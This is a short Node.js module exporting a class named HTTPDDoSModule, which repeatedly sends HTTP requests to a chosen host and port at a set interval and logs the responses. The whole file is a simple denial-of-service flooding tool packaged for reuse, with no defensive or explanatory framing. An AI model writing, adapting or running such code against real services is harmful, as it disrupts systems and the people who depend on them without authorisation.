const fetch = require("node-fetch");

class HTTPDDoSModule {
  #host = "";
  #port = 0;
  #requestCount = 0;
  #protocol = "";

  constructor(host, port, ms, protocol) {
    this.ms = ms;
    this.#host = host;
    this.#port = port;
    this.#protocol = protocol;
  }

  init() {
    setInterval(this._makeRequest.bind(this), this.ms);
  }

  _makeRequest() {
    fetch(`${this.#protocol}://${this.#host}:${this.#port}`)
      .then((data) => data.json())
      .then((body) => {
        console.log(body);
      });
  }
}

module.exports = HTTPDDoSModule;
